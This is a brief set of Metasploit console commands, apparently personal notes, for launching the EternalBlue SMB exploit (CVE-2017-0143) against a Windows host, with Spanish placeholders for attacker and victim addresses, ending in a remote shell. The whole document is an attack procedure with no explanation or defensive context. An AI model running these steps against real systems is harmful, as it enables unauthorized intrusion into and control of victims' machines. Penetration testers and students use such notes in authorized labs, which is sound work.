```bash

metasploit
search CVE-2017-0143
use exploit/windows/smb/ms17_010_eternalblue
show options
set LHOST ipAtacante

set RHOST ipVictima
set RPORT portVictima
run || exploit

shell

```